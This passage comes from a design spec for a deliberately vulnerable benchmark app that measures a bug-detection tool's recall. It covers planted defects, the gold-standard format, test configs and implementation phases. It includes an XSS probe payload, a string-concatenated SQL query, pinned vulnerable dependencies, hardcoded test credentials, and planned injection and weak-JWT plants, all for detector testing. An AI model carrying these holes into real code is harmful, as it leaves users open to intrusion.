  P1: JWT verification rejects tokens issued more than 30s in the future even with 5min skew tolerance documented
  P2: Password reset token rejects when system clock advances 1min during validation

clock_overflow                                        [2] (major)
  P1: /billing trial-end calculation uses `setTime(date.getTime() + 30*24*60*60*1000)` — overflows on edge dates
  P2: /api/tasks due-date sorter sorts numerically and overflows on year > 2100

clock_dst_corruption                                  [2] (minor)
  P1: /profile recurrence rule "every Mon at 9am" shifts on DST in some TZs
  P2: /billing renewal date doubles up on fall-back DST day

clock_leap_day_failure                                [2] (minor)
  P1: /api/billing/anniversary throws on Feb 29 → Feb 30 calculation
  P2: /api/tasks due-date validator rejects Feb 29 in leap year

clock_timezone_display                                [2] (minor)
  P1: /inbox renders timestamps in server TZ instead of viewer TZ
  P2: /billing renders renewal date as raw ISO string

i18n_rtl_layout_break                                 [2] (major)
  P1: /help/:slug locale=ar layout has fixed-position buttons that overlap content
  P2: /boards locale=he sidebar overlaps board column

i18n_long_string_overflow                             [2] (minor)
  P1: /help/:slug locale=de title truncates with ellipsis but loses meaning
  P2: /admin/users locale=fi role labels overflow column width

i18n_date_format_ambiguous                            [2] (minor)
  P1: /billing renders 02/03/2026 (US ambiguous to en-GB users)
  P2: /inbox renders 01/05/26 across locales

i18n_hardcoded_string                                 [3] (minor)
  P1: src/components/TaskCard.tsx has literal "Mark as done" not via i18n
  P2: src/pages/AdminReports.tsx has literal "Generate report"
  P3: src/components/Pricing.tsx has literal "Most popular"
  Detector: hardcoded-strings.ts (static)

i18n_pluralization_broken                             [2] (minor)
  P1: /boards/:id renders "1 tasks" / "2 tasks" / "0 tasks" (no plural rule)
  P2: /inbox renders "1 unread notifications"

i18n_currency_format_broken                           [2] (minor)
  P1: /billing renders "$1234" instead of "$1,234.00"
  P2: /pricing renders "USD9.99" instead of "$9.99"

i18n_timezone_display_wrong                           [2] (minor)
  P1: /profile saved TZ "Pacific/Auckland" displays as "GMT+12" (should be NZST)
  P2: /inbox displays UTC timestamps as if they were local
```

### 4.11 Core kinds (12 wired, 27 plants)

```
console_error                                         [2] (major)
  P1: /boards/:id logs `console.error("SELF-TEST CONSOLE ERROR: failed to load")` on mount of one card
  P2: /search logs `console.error("Bench: search failed")` on empty input
  Note: rootCauseSubstring "SELF-TEST CONSOLE ERROR" is preserved on P1
  for back-compat with the existing self-test gold-bug substring matcher.

react_error                                           [2] (critical)
  P1: /boards/:id renders <BadComponent/> that throws "SELF-TEST RENDER FAIL" inside render
  P2: /admin/reports has a child component that throws on null prop access

unhandled_exception                                   [2] (critical)
  P1: /boards/:id mounts a hook that does `setTimeout(() => { throw new Error('SELF-TEST UNCAUGHT ASYNC') }, 100)`
  P2: /realtime onmessage callback throws unhandled

hydration_mismatch                                    [2] (major)
  P1: / (marketing) renders `Date.now()` server-side and client-side, mismatching
  P2: /pricing reads `window` in render (SSR-rendered HTML differs from CSR)
  Note: Vite is CSR-only; we still emit a hydration mismatch by using
  react-snap or a stub SSR layer in dev. If unworkable, drop to 1 plant
  + clarify in MANIFEST.json. (Coder must read SPEC_V25 to confirm wiring.)

network_5xx                                           [2] (major)
  P1: GET /api/boom returns 500 (intentional)
  P2: /dashboard hits /api/boards/stats which returns 502 randomly (1/3)

network_4xx_unexpected                               [2] (minor)
  P1: GET /api/teapot returns 418 (unexpected)
  P2: /admin/reports hits /api/admin/quota returning 429 unexpectedly

404_for_linked_route                                 [see § 4.7]

missing_state_change                                  [2] (major)
  P1: /boards/:id "Add task" button click → no DOM change for >1.5s (synthetic delay)
  P2: /admin/users role toggle → no visible state change

surface_call_failed                                   [2] (major)
  P1: SurfaceMCP `surface_login` for `member` role intentionally returns failure on first attempt then succeeds
  P2: SurfaceMCP `surface_describe_self` for `comprehensive-bench-api` returns degraded status mid-run
  Required infra: a small `bench/surface-faults.json` map that the harness reads to inject these failures into surfacemcp shim; OR (simpler) use real failure paths by mis-configuring one role's password in seed.json
  (P1) and one openapi doc URL temporarily (P2). The static plant route uses
  the seed.json mis-config approach; runtime P2 needs a tiny harness toggle.

dom_error_text                                       [see § 4.7]

visual_anomaly                                        [2] (major)
  P1: /boards/:id has overlapping z-index causing button to be visually under the modal backdrop on first paint
  P2: /pricing has the price card 200% wider than viewport at 1280px width
  Detector: classify/vision.ts:411 — vision LLM call. Plant must be visually obvious.

accessibility_critical                               [see § 4.5]

interactive_element_missing_accessible_name          [see § 4.5]
```

### 4.12 Agentic (1 wired kind, 0 new plants)

```
prompt_injection_executed                             [reuse pen-bad]
  Plant remains in pen-bad; no new plant in comprehensive-bench.
  MANIFEST.json#coverageMatrix references both apps so calibration
  reports the existing plant correctly. Leave the deferred V43 kinds
  out entirely (see § 4.13).
```

### 4.13 Deferred kinds — explicit zero coverage

The following kinds are `status: 'deferred'` in registry. They get **zero plants** and **zero gold lines** in this fixture:

```
agent_action_timeout, agent_cost_per_turn_high, agent_response_hallucinated,
animation_state_corruption, autofill_state_desync, dark_mode_layout_break,
drag_drop_failure, forced_colors_failure, idempotency_key_violation,
infinite_loading, orientation_change_layout_break, paste_handler_failure,
permission_denied_unhandled, print_stylesheet_broken, pull_to_refresh_conflict,
reduced_motion_violation, soft_keyboard_occlusion, streaming_response_truncated,
tool_call_failure_unhandled, viewport_100vh_break, xss_stored, zoom_layout_break
```

When a deferred kind is wired (typically a v0.50 PR), V54.10 (or sibling) adds plants. Until then, these are not part of the recall denominator — see § 8.

---

## 5. `gold-standard.jsonl` format

One line per **plant** (not per kind). One file at `apps/comprehensive-bench/gold-standard.jsonl`. Mirrors the existing bench-app shape exactly so `scripts/validate-manifest.mjs` runs unmodified.

```jsonc
{
  "goldId": "comprehensive-bench-001",
  "kind": "xss_reflected",
  "expected": "detector_fires",
  "structuralMatch": {
    "kind": "xss_reflected",
    "normalizedLocation": "/api/search",
    "normalizedMessage": "search-q-reflected"
  },
  "rationale": "GET /api/search?q=<payload> reflects q into HTML response without escaping.",
  "humanRepro": [
    "Login as member1@bench.local",
    "Navigate to /search?q=<script>alert(1)</script>",
    "Observe <script> tag is rendered into the result-summary <p>"
  ],
  "expectedOccurrences": [2, 3],
  "expectedSeverity": "critical",
  "discoverableVia": "ui-walk",
  "minClusterSize": 1,
  "addedInBenchVersion": "0.2.0"
}
```

### 5.1 Required fields (every line)

- `goldId` — `comprehensive-bench-NNN` zero-padded to 3 digits, sequential, gap-free.
- `kind` — must equal a `wired` BugKind in registry. Validated by `validate-manifest.mjs`.
- `expected` — fixed string `"detector_fires"`. Negative entries (`"detector_silent"`) live in MANIFEST coverageMatrix, not here.
- `structuralMatch.kind` — same as top-level `kind`.
- `structuralMatch.normalizedLocation` — the route path (UI) or endpoint path (API) for the plant. Use the routing template form (`/api/tasks/{id}`, not `/api/tasks/abc`).
- `structuralMatch.normalizedMessage` — kebab-case short signature (≤40 chars). Pinned in registry; multiple plants of the same kind have different messages.
- `rationale` — one sentence, why this is a bug.
- `humanRepro` — array of strings, 2–6 lines, copy-pasteable repro.
- `expectedOccurrences` — `[min, max]` integer range. For most plants `[1, 1]` (one detection per plant). `[2, 3]` allowed for kinds where the runner mutates many params and produces multiple detections per plant location (e.g. SQLi runner mutates 5 params → 1 plant produces 1–5 detections; range absorbs this).
- `expectedSeverity` — equal to `defaultSeverity` from registry for the kind unless explicit per-detection override is documented. (No override planned in v0.54.)
- `discoverableVia` — one of `"ui-walk" | "api-probe" | "static-scan" | "synthetic-runner" | "vision-llm"`. Helps debug recall regressions: when a kind misses, you instantly see whether the missing path is the runner or the detector.
- `minClusterSize` — `1` always (calibration tool requirement).
- `addedInBenchVersion` — `"0.2.0"` for all v54 entries (the bench bumps minor when comprehensive-bench lands).

### 5.2 Optional fields

- `notes` — free-form, used for plants that need a coder-facing comment ("requires multi-context runner; surface=comprehensive-bench-web").
- `acceptableMisses` — integer, default 0. Set to `1` for kinds that probabilistically miss (e.g. `slow_lcp` on a fast machine, vision plants on a flaky LLM). Use sparingly — at most 5 entries fixture-wide. **Justify each in `notes`.**
- `requiresFlag` — string, e.g. `"--mode=full"`. For plants that only fire when BugHunter runs in a non-default mode. None expected for v54.

### 5.3 Negative entries — `expect: detector_silent`

We do **not** put negative entries in `gold-standard.jsonl`. Negatives (kinds-with-no-plant-here) are tracked in the bench `MANIFEST.json#coverageMatrix` instead — for `comprehensive-bench`, every wired kind appears in `kindsCovered`, so the negative set for this app is empty. `xss_stored` and the deferred kinds are tracked in MANIFEST as `wiredOrDeferred: "deferred"` with `appsCovered: []`.

---

## 6. Multi-surface SurfaceMCP config

### 6.1 `apps/comprehensive-bench/surfacemcp.config.json`

```json
{
  "version": "1.0",
  "surfaces": [
    {
      "name": "comprehensive-bench-web",
      "stack": "vite",
      "root": ".",
      "baseUrl": "http://127.0.0.1:4106",
      "port": 4106,
      "launchDevCommand": "npm run dev",
      "watchPaths": ["src"],
      "watchIgnore": ["dist", "node_modules"],
      "auth": {
        "kind": "credentials",
        "loginUrl": "http://127.0.0.1:4106/login",
        "tokenStorage": "httpOnly-cookie"
      },
      "roles": [
        { "name": "anonymous",    "credentials": {} },
        { "name": "member",       "credentials": { "email": "member1@bench.local", "password": "MemberBench1!" } },
        { "name": "member-other", "credentials": { "email": "member2@bench.local", "password": "MemberBench2!" } },
        { "name": "admin",        "credentials": { "email": "admin@bench.local",   "password": "AdminBench123!" } }
      ],
      "excludedRoutes": []
    },
    {
      "name": "comprehensive-bench-api",
      "stack": "openapi",
      "root": "server",
      "baseUrl": "http://127.0.0.1:4156",
      "port": 4156,
      "launchDevCommand": "node server/index.js",
      "watchPaths": [],
      "watchIgnore": [],
      "auth": {
        "kind": "credentials",
        "loginEndpoint": "POST /api/auth/login",
        "tokenStorage": "httpOnly-cookie"
      },
      "roles": [
        { "name": "anonymous",    "credentials": {} },
        { "name": "member",       "credentials": { "email": "member1@bench.local", "password": "MemberBench1!" } },
        { "name": "member-other", "credentials": { "email": "member2@bench.local", "password": "MemberBench2!" } },
        { "name": "admin",        "credentials": { "email": "admin@bench.local",   "password": "AdminBench123!" } }
      ],
      "excludedRoutes": []
    }
  ]
}
```

This is **identical** in shape to `bughunter-self-deliberate-bugs/surfacemcp.config.json#surfaces[]` — multi-surface support is already in v0.3.0 (see V53). Calibration tooling and the v0.53 multi-surface BugHunter consumer both Just Work.

### 6.2 `apps/comprehensive-bench/bughunter.config.json`

```json
{
  "projectName": "bench-comprehensive",
  "baseUrl": "http://127.0.0.1:4106",
  "auth": {
    "kind": "credentials",
    "loginUrl": "http://127.0.0.1:4106/login",
    "credentials": [
      { "role": "admin",        "email": "admin@bench.local",   "password": "AdminBench123!" },
      { "role": "member",       "email": "member1@bench.local", "password": "MemberBench1!" },
      { "role": "member-other", "email": "member2@bench.local", "password": "MemberBench2!" }
    ]
  },
  "discovery": { "deepCrawl": true, "maxBugsPerKind": 50, "budgetMs": 1500000 },
  "expectedRuntimeMs": 1200000,
  "calibrate": {
    "seedScript": "../../scripts/reset-seed.sh comprehensive-bench",
    "bootScript": "../../scripts/boot.sh comprehensive-bench",
    "teardownScript": "../../scripts/teardown.sh comprehensive-bench",
    "healthCheckUrl": "http://127.0.0.1:4106/healthz",
    "healthCheckTimeoutMs": 60000
  }
}
```

Budget: 25 minutes (1.5M ms). Expected: 20 minutes. Headroom: 5 minutes for BugHunter's internal phases + healthcheck slack. § 8 acceptance criteria gates total at 30 minutes.

---

## 7. Implementation phasing

Each phase is **one PR by one Sonnet coder**. Phases are independent except where noted. All phases land on a single feature branch `comprehensive-bench` in `BugHunter-bench`; merged into `main` only after V54.9 lands.

### V54.1 — Scaffold
**Files to create:**
- `apps/comprehensive-bench/package.json`
- `apps/comprehensive-bench/vite.config.ts`
- `apps/comprehensive-bench/tsconfig.json`
- `apps/comprehensive-bench/index.html`
- `apps/comprehensive-bench/src/main.tsx`, `src/App.tsx`, `src/router.tsx`
- `apps/comprehensive-bench/src/lib/auth.ts` (real JWT; plants come in later phases)
- `apps/comprehensive-bench/src/lib/api.ts` (fetch wrapper)
- `apps/comprehensive-bench/server/index.js` (Express + OpenAPI doc shell)
- `apps/comprehensive-bench/server/seed.ts` (seed data loader)
- `apps/comprehensive-bench/seed.json` (initial seed — NO plants)
- `apps/comprehensive-bench/healthz.ts` (healthcheck endpoint)
- `apps/comprehensive-bench/surfacemcp.config.json`
- `apps/comprehensive-bench/bughunter.config.json`
- `apps/comprehensive-bench/README.md`
- `apps/comprehensive-bench/gold-standard.jsonl` — empty file
- `apps/comprehensive-bench/gold-standard.md` — heading-only stub
**Files to modify:**
- `MANIFEST.json` — add `comprehensive-bench` app entry with empty `kindsCovered` (filled in V54.9)
- `scripts/boot.sh`, `scripts/teardown.sh`, `scripts/reset-seed.sh` — add `comprehensive-bench` case
- root `package.json#workspaces` — add `apps/comprehensive-bench`
**DO NOT:** plant any bugs. **Done when:** `npm run boot comprehensive-bench` boots two surfaces, `curl http://127.0.0.1:4106/healthz` returns 200, `curl http://127.0.0.1:4156/openapi.json` returns OpenAPI doc, `npm run validate-manifest` passes (empty gold is acceptable here per validator).

### V54.2 — Security plants (categories § 4.1, § 4.2, § 4.3)
**Plants:** 30 + 17 + 14 = 61 plants across 27 kinds.
**Files to create:** `server/handlers/auth.ts`, `server/handlers/admin.ts`, `server/handlers/files.ts`, `server/handlers/search.ts`, `server/handlers/billing.ts`, `server/handlers/headers.ts`, `server/handlers/webhooks.ts`. `src/pages/Login.tsx`, `src/pages/Signup.tsx`, `src/pages/Reset.tsx`, `src/pages/OAuthCallback.tsx`, `src/pages/Search.tsx`, `src/pages/AdminUsers.tsx`, `src/pages/AdminReports.tsx`, `src/pages/AdminFiles.tsx`. SQLite DB at `server/data/search.sqlite` + seed script.
**Files to modify:** `seed.json` (add `u-other`), `src/router.tsx` (register pages), `src/lib/auth.ts` (add the deliberate hardcoded credentials).
**Gold lines added:** `comprehensive-bench-001` … `comprehensive-bench-061`.
**DO NOT:** plant outside § 4.1–4.3. Defer perf/a11y/SEO. Do not weaken existing seed-data; the SQLi plant uses a separate sqlite DB.
**Done when:** `bughunter run --kind=sql_injection|xss_*|idor_*|csrf_*|jwt_weak_alg|path_traversal|command_injection` against the booted fixture detects ≥85% of the planted shapes (calibration tool reports per-kind recall).

### V54.3 — Performance plants (§ 4.4)
**Plants:** 25 across 11 kinds.
**Files to create:** `src/pages/Dashboard.tsx`, `src/pages/Boards.tsx`, `src/pages/Profile.tsx`, `src/components/SidebarMe.tsx` (dedup plant). `src/lib/heavy-fuzzy.ts` (50k-item match for slow_inp, main_thread_blocked).
**Files to modify:** `src/main.tsx` (add the moment.js + lodash full imports for oversized_bundle), `vite.config.ts` (no manualChunks — let bundle balloon).
**Gold lines added:** `comprehensive-bench-062` … `comprehensive-bench-086`.
**DO NOT:** modify any security plant. Do not add tests that mock fetch — the dedup/N+1 plants depend on real fetch counts.
**Done when:** `bughunter run --kind=slow_lcp|n_plus_one_api_calls|...` detects ≥85%. `npm run build` succeeds. Bundle size at `/` is >500KB gzipped (oversized_bundle plant verified).

### V54.4 — Accessibility plants (§ 4.5)
**Plants:** 18 across 8 kinds.
**Files to modify:** TaskCard, TaskDetailModal, ChipLabel, SearchInput, ProfileForm, AdminUsersTable, plus `src/pages/Boards.tsx`, `src/pages/AdminFiles.tsx`. `src/styles/global.css` (color contrast + hover-only CSS).
**Gold lines added:** `comprehensive-bench-087` … `comprehensive-bench-104`.
**DO NOT:** "fix" axe violations on routes that aren't in this phase's plant list. Touch only the named files.
**Done when:** axe-core run against `/boards/:id` returns ≥1 critical, color contrast scanner returns ≥2 strong violations.

### V54.5 — Structural / SEO / nav (§ 4.6, § 4.7)
**Plants:** 13 + 18 = 31 across 14 kinds.
**Files to create:** `src/pages/Help.tsx`, `src/pages/HelpIndex.tsx`, `src/components/Pricing.tsx` (already partially in V54.1 — extend).
**Files to modify:** `src/router.tsx` (`/help/:slug`, `/pricing`), `index.html` template (per-route `<title>` + meta), each page component to embed the plant in its head/h1.
**Gold lines added:** `comprehensive-bench-105` … `comprehensive-bench-135`.
**DO NOT:** add real i18n yet — that's V54.10.
**Done when:** SEO crawler reports the planted defects on the planted routes; nav-state runner emits the nav_* kinds.

### V54.6 — Data integrity (§ 4.10 first 6 kinds: orphan, money, cache, audit, soft-delete + their clock siblings)
**Plants:** 6 kinds × 2 plants = 12 (subset of § 4.10).
**Files to modify:** `server/handlers/billing.ts` (money + audit), `server/handlers/admin.ts` (audit + soft-delete read), `server/handlers/notifications.ts` (cache), `server/handlers/boards.ts` and `tasks.ts` (orphan + soft-delete).
**Gold lines added:** `comprehensive-bench-136` … `comprehensive-bench-147`.
**DO NOT:** plant `idempotency_key_violation` (deferred).
**Done when:** dataIntegrity/evaluator emits all 6 kinds at runtime.

### V54.7 — Browser platform (§ 4.8)
**Plants:** 17 across 8 kinds.
**Files to create:** `src/pages/WidgetsEmbed.tsx`, `src/pages/Realtime.tsx`, `public/sw.js` (deliberate stale SW), `src/workers/search-worker.ts`, `src/components/HelpCard/help-card.ts` (custom element + shadow DOM).
**Files to modify:** `vite.config.ts` (add `import.meta.env.VITE_TRUSTED_TYPES_ROUTES` env var passing required-trusted-types-for to specific routes via `<meta>` tag injection).
**Gold lines added:** `comprehensive-bench-148` … `comprehensive-bench-164`.
**DO NOT:** disable trusted types globally — only on the routes named in § 4.8.
**Done when:** browser-platform-probe.ts emits all 8 kinds in a chromium run.

### V54.8 — Race + multi-context + network faults (§ 4.9)
**Plants:** 23 across 10 kinds.
**Files to create:** `src/lib/realtime-channel.ts` (broadcast plant), `src/components/TaskBoardDND.tsx` (drag-drop optimistic plant).
**Files to modify:** `src/pages/BoardDetail.tsx`, `src/pages/Realtime.tsx`, `src/pages/Search.tsx`, `src/pages/Inbox.tsx`, `src/pages/AdminUsers.tsx`. Server: `server/handlers/tasks.ts`, `server/handlers/notifications.ts` to emit 500 on specific probe headers (network-fault runner injects via header).
**Gold lines added:** `comprehensive-bench-165` … `comprehensive-bench-187`.
**DO NOT:** introduce real async bugs unrelated to plant shape. Each plant has a precise failure path; do not let it leak into other tests.
**Done when:** race-runner.ts and multi-context-runner.ts and network-fault detectors all emit on the planted routes.

### V54.9 — Core kinds + i18n + clock + remainder (§ 4.10 i18n + clock subset, § 4.11 core, § 4.12 reuse)
**Plants:** ~50 across the core + i18n + clock + agentic-reuse kinds.
**Files to create:** `src/lib/i18n.ts` (intentional broken plural rules, broken Intl.DateTimeFormat use), `src/locales/{en,de,he,ar,fr,fi}.json` (with deliberate length / RTL / format inconsistencies). `src/components/ConsoleErrorMounter.tsx`, `src/components/RenderFailComponent.tsx`. `server/handlers/clock.ts` (clock-test-runner targets).
**Files to modify:** `MANIFEST.json#apps[5].kindsCovered` — populate full list of ~95 kinds. `MANIFEST.json#coverageMatrix` — append `comprehensive-bench` to `appsCovered` array for every wired kind. `gold-standard.md` — heading per goldId (validator requires count match).
**Gold lines added:** `comprehensive-bench-188` … `comprehensive-bench-232` (final count adjusts to actual; target 230 ± 5).
**DO NOT:** alter any earlier gold IDs. Append-only.
**Done when:**
- `npm run validate-manifest` passes.
- Every wired kind in registry has `appsCovered` containing `comprehensive-bench` OR is explicitly listed in MANIFEST.coverageMatrix as covered elsewhere (only `prompt_injection_executed` falls in this category).
- `gold-standard.jsonl` line count equals `gold-standard.md` `## Gold-N` heading count.
- BugHunter end-to-end run against the booted fixture produces ≥75% recall (see § 8).

### V54.10 — Migration + self-test wiring (BugHunter side)
**Repo:** `BugHunter` (not `BugHunter-bench`).
**Files to modify:**
- `packages/cli/src/cli/self-test.ts` (or wherever the self-test target lives) — switch primary target from `bughunter-self-deliberate-bugs` to a checkout of `BugHunter-bench/apps/comprehensive-bench`. Old fixture stays as secondary regression target, gated by `--legacy-fixture` flag.
- `fixtures/bughunter-self-deliberate-bugs/golden-bugs.jsonl` — annotate kinds whose canonical home is now `comprehensive-bench` with `"canonicalIn": "comprehensive-bench"`. Existing entries stay (don't break the v33 lockstep test).
- `docs/SPEC_V33_SELF_TEST.md` (if present) — update target path.
- `docs/README.md` — update the recall section to cite `comprehensive-bench` as the canonical benchmark.
**DO NOT:** delete the old fixture. Do not break the existing reuse-manifest unit test.
**Done when:** `bughunter self-test` runs against `comprehensive-bench` by default, against the legacy fixture under `--legacy-fixture`, both green.

### Parallelism

V54.1 must land first (everyone depends on the scaffold). V54.2 through V54.8 can run in parallel — each touches disjoint files (the file map above is intentional). V54.9 must land last in the bench repo (it edits MANIFEST.json and writes the final gold lines that require knowledge of all earlier plant locations). V54.10 is in BugHunter, not the bench, and waits on V54.9 only because the self-test integration test needs the boot script to work.

Recommended assignment for 5–6 Sonnet coders working concurrently:
- Coder A: V54.1, then V54.6
- Coder B: V54.2 (security — biggest)
- Coder C: V54.3 (perf)
- Coder D: V54.4 + V54.5 (a11y + structural)
- Coder E: V54.7 + V54.8 (browser platform + race)
- Coder F (or A returning): V54.9 + V54.10

---

## 8. Acceptance criteria

Acceptance is measured by the `bughunter run` invocation defined in `bughunter.config.json` against a freshly booted `comprehensive-bench`. Each criterion is a hard gate.

1. **Per-kind coverage floor.** For every `wired` kind in `DETECTOR_REGISTRY` except `prompt_injection_executed`, `gold-standard.jsonl` contains **≥2 entries** with that `kind`. Validator `scripts/validate-manifest.mjs` extended to enforce this (see V54.9).
2. **Recall ≥75%.** `(detected wired kinds) / (planted wired kinds)` ≥ 0.75. Detection counts a kind as "found" if BugHunter emits ≥1 finding of that kind. (Per-plant recall is also reported but is not a gate — many detectors emit one finding per cluster regardless of plant count.)
3. **False positives = 0** on the canonical recall-baseline run (`bughunter run --mode default`). The FP fixers from this session must hold; any new FP fails CI. Out-of-scope-mode FPs (e.g. `--mode aggressive`) are not gated here.
4. **Runtime ≤30 minutes.** Wall clock for boot + `bughunter run` + teardown, on the existing CI infra (n2-standard-4 equivalent). Budgeted at 25 min, gated at 30 min.
5. **Replaces self-test target.** `bughunter self-test` (no flag) runs against `comprehensive-bench`. `bughunter self-test --legacy-fixture` runs against `bughunter-self-deliberate-bugs`. Both pass. Old fixture's existing recall floor (currently encoded in its `golden-bugs.jsonl`) is preserved.
6. **Reproducibility.** Two consecutive runs against an unchanged fixture produce gold-match counts within ±2 entries. Plants whose detection is probabilistic (vision LLM, vitals) carry `acceptableMisses: 1`; total fixture-wide `acceptableMisses` ≤ 5.
7. **Validator green.** `npm run validate-manifest` passes. JSONL parses. `gold-standard.md` heading count == JSONL line count. Every `kind` in JSONL exists in registry. Every plant route exists in the booted app (HEAD probe in validator).
8. **No new dependencies in BugHunter.** The fixture may add `better-sqlite3`, `lodash@4.17.20` (deliberate vulnerable plant), `axios@0.21.0` (deliberate vulnerable plant) under `apps/comprehensive-bench/package.json`. **Zero changes** to BugHunter core dependencies.
9. **Per-detector regression sentinel.** A new BugHunter unit test, `packages/cli/test/comprehensive-bench-coverage.test.ts`, snapshot-asserts the kind set covered by `comprehensive-bench`'s gold-standard. If a wired kind regresses to zero plants, the test fails.

---

## 9. Migration story

### 9.1 What stays

- `fixtures/bughunter-self-deliberate-bugs/` stays on disk.
- Its `golden-bugs.jsonl` stays valid against itself.
- The lockstep unit test on `(registry, reuse-manifest, golden-bugs)` continues to enforce that any **new** wired kind in registry must add an entry to **either** the old fixture's coverage map **or** be marked covered-in-comprehensive-bench in `MANIFEST.json#coverageMatrix`. Update the lockstep test in V54.10 to read both manifests.
- `pen-bad` keeps `prompt_injection_executed` (no need to migrate; LLM stub doesn't fit a PM domain naturally).

### 9.2 What changes

- `bughunter self-test` default target is now `comprehensive-bench`.
- The recall number cited in `docs/README.md` and dashboards is the `comprehensive-bench` recall (replaces the 12.4% number).
- New `wired` BugKinds, going forward, are required to have plants in `comprehensive-bench` first; reuse fixtures are optional supplements.
- `MANIFEST.json#apps` grows from 5 to 6.
- `MANIFEST.json#coverageMatrix` gains `comprehensive-bench` references for every wired kind.
- `bench/0.1.0` → `bench/0.2.0` (`MANIFEST.json#benchVersion`).

### 9.3 What contributors must know

- Adding a wired kind: spec it in BugHunter, then in the **same week** add 2 plants to `comprehensive-bench` and 2 gold lines. The lockstep test enforces this by failing if a new wired kind has zero plants in the canonical fixture for >7 days (CI gate is named, lockstep is a runtime gate).
- The README at `apps/comprehensive-bench/README.md` is the contributor's how-to. Phase V54.1 writes it.

---

## 10. Test strategy

### 10.1 Plant-presence unit tests

Each phase ships a small unit test that asserts the plant is on disk and well-formed. These tests run as part of the `bench-comprehensive` package's `npm test` and are **not** allowed to call BugHunter — they only assert the plant's static shape so a refactor that accidentally fixes a plant breaks the test loudly.

Examples:
- V54.2: `tests/plants/sql-injection.test.ts` — asserts `server/handlers/search.ts` contains the literal string `` `SELECT * FROM products WHERE name LIKE '%${q}%'` `` (string-concat marker).
- V54.4: `tests/plants/contrast.test.ts` — runs axe-core against `/boards/:id/task/:taskId` JSDOM and asserts ≥1 violation of `color-contrast` rule.
- V54.7: `tests/plants/sw-stale.test.ts` — asserts `public/sw.js` does **not** contain `self.skipWaiting()`.

These are **plant assertions**, not behaviour tests. They are deliberately fragile against accidental fixes.

### 10.2 Smoke: end-to-end recall

A single CI job, `bench:comprehensive-bench:recall`:
1. `pnpm install`
2. `npm run boot comprehensive-bench`
3. wait for healthcheck
4. `pushd /root/BugHunter && pnpm run cli -- run --project-dir /tmp/bench/apps/comprehensive-bench`
5. parse the run report, compute recall against `gold-standard.jsonl`
6. assert recall ≥ 0.75, FP count == 0, runtime < 30min
7. `npm run teardown comprehensive-bench`

Job fails if any of (recall, FP, runtime) gate fails.

### 10.3 Determinism check

Run the smoke twice in CI and assert the two recall numbers differ by ≤2 detected kinds. Catches probabilistic-detector regressions before they corrupt our recall number.

### 10.4 Coverage regression sentinel

V54.10's `comprehensive-bench-coverage.test.ts` reads the registry (`DETECTOR_REGISTRY`), reads `gold-standard.jsonl`, and asserts:
- Every wired kind (sans `prompt_injection_executed`) has ≥2 entries.
- No gold entry references a non-existent `kind`.
- No gold entry references a `deferred` kind.

Runs in BugHunter's `npm test`. If a kind silently de-promotes to deferred, this fails before anyone notices recall drift.

---

## 11. Open questions / risks

- **Q1.** `hydration_mismatch` on a CSR-only Vite app — does the existing detector fire? (registry says `inputSource: production`; runner is `phases/execute.ts`.) **Action:** V54.9 coder reads `classify/react.ts:38` to confirm and either ships a stub SSR shim with `react-snap` OR drops to 1 plant + documents the limitation in MANIFEST. Spec gates at "≥2 entries per kind" but allows V54.9 to file a follow-up if hydration_mismatch is genuinely unreachable in vite-only stacks; in that case the kind moves to `next-blog`'s 2nd plant slot.
- **Q2.** `surface_call_failed` requires a SurfaceMCP failure path to be triggerable from a fixture. The seed-misconfig approach (P1) works; the runtime degradation (P2) needs a `bench/surface-faults.json` toggle that the harness reads. **Action:** V54.9 coder verifies in V53 multi-surface code path; if too invasive, drops P2 and uses a single-plant entry with `acceptableMisses: 1`.
- **Q3.** `vulnerable_dependency_high` fires on dev-deps too — confirm with `npm-audit.ts:31`. **Action:** V54.2 coder reads the static tool source before placing the vulnerable lodash/axios in `dependencies` vs `devDependencies`. Spec says `dependencies` (production), but if static tool only scans production, that's where the plants must live.
- **Q4.** Total runtime risk — 22 routes × per-role × per-mutator × 6 surfaces (well, 2 surfaces here) is a lot. **Action:** V54.9 measures end-to-end on representative hardware before merging V54.10. If >30 minutes, raise `apiConcurrency` in `bughunter.config.json` rather than cut plants.
- **Q5.** `xss_stored` is `deferred` but is a real bug genre and a comment-system natural fit. **Action:** spec leaves it out of v54. When v0.55 (or wherever `xss_stored` is wired) lands, V54.11 adds 2 plants in `/boards/:id/task/:taskId` (planted comment with `<script>`).

---

## 12. Approval gate

Before V54.1 starts, the following must be true:
- @architect: this spec lands in repo as `BugHunter/docs/specs/V54_COMPREHENSIVE_BENCHMARK.md`.
- @lead-coder: confirms V54.1 scaffold scope is single-PR (≤8 hours of one Sonnet coder).
- @qa: confirms the recall ≥75% gate matches the fixture-author's intent (i.e. we accept that ~5 kinds will silently miss in any given run).
- @devops: confirms the +6 minutes (vs 24min for current 5-app boot) fits CI budget.

Once all four nod, V54.1 lands first; V54.2–V54.8 fan out in parallel.
